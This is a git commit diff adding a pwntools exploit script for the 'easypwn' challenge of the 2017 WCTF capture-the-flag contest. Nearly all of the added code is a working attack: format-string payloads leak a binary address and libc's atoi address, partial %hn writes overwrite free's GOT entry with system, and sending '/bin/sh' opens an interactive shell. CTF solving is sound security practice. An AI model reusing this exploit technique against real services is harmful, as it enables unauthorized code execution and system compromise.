52c1947d3734ab744ddd6fc23a3bc603b9b5de9a
driedfish <dead0x01@gmail.com>
2017-09-19 00:21:42 +0800

    solve easy

--- ctfs/2017/wctf/easypwn/template.py
+++ ctfs/2017/wctf/easypwn/template.py
@@ -12,17 +12,15 @@ context.clear(arch="amd64")
 elf = ELF(elf_name)
 
 if LOCAL:
-    smlbin_area_off = 0x3C3B78
-    execv_binsh_off = 0xF0567
-    malloc_hook_off = 0x3C3B10
-    context.log_level = "debug"
+    # context.log_level = "debug"
     mine_env = os.environ
-    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
+    #mine_env['LD_PRELOAD'] = "./lib.so.6:/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
+    mine_env['LD_PRELOAD'] = "./lib.so.6"
     io = process(elf_name, env=mine_env)
+    libc = ELF("./libc.so.6")
 else:
-    printf_off = 0x4CDD0
-    system_off = 0x3FE70
     io = remote(remote_host, remote_port)
+    libc = ELF("./libc.so.6")
 
 def dlySend(sdstr):
     io.send(sdstr)
@@ -43,14 +41,60 @@ def tell_name(mcontent):
     dlySend(mcontent)
 
 def s_exp():
-    payload = 'A'*0x400
-    payload += "e"
-    pause()
+    tell_name('a'*0x100)
+
+    payload = 'A'*0x3E8
+    # "START_%389$x_END"
+    payload += "START_%389$ld_END"    #5 2D029E5CF9 9EB066CCF9
     mod_1(payload)
     io.recvuntil("Your Input Is :")
-    data = io.recvline()[:-1]
+    io.recvuntil("%389$ld_ENDART_")
+    data = io.recvuntil("_ENDART")[:-7]
+    m_lkaddr = int(data)
+    atoi_gotoff = 0x201377
+    atoi_got = m_lkaddr + atoi_gotoff
+    free_got = atoi_got - 0x58
+
+    log.info("atoi got addr:"+hex(atoi_got))
+
+    payload = 'A'*0x3E8
+    #payload += "ND_%262$x_ENDNDN"   #5 54A8 9EB066CCF9
+    payload += "ND_%133$s_ENDNDN"
+    payload += p64(atoi_got)
+    mod_1(payload)
+    io.recvuntil("Your Input Is :")
+    io.recvuntil("NDNp")
+    io.recvuntil("_")
+    data = io.recvuntil("_E")[:-2]
+    atoi_addr = u64(data.ljust(8, chr(0)))
+    log.info("atoi addr:"+hex(atoi_addr))
+    libc.address = atoi_addr - libc.symbols["atoi"]
+    log.info("libc address:"+hex(libc.address))
+    log.info("system address:"+hex(libc.symbols["system"]))
+    log.info("free address:"+hex(libc.symbols["free"]))
     pause()
-    tell_name('a'*0x100)
+
+    # exp
+    payload = 'A'*0x3E8
+    part1_le = libc.symbols["system"] & 0xFFFF
+    part1_le = part1_le-0x3E8-0x15
+    #payload += "%" + str(part1_le) + "$5d%133$hn"
+    payload += "N_%" + str(part1_le) + "d%133$hn"
+    payload = payload.ljust(0x3f8, chr(0))
+    payload += p64(free_got)
+    mod_1(payload)
+
+    payload = 'A'*0x3E8
+    part1_le = (libc.symbols["system"]>>8) & 0xFFFF
+    part1_le = part1_le-0x3E8-0x15
+    #payload += "%" + str(part1_le) + "$5d%133$hn"
+    payload += "N_%" + str(part1_le) + "d%133$hn"
+    payload = payload.ljust(0x3f8, chr(0))
+    payload += p64(free_got+1)
+    mod_1(payload)
+
+    tell_name("/bin/sh\x00")
+    io.interactive()
 
 
 if __name__ == "__main__":
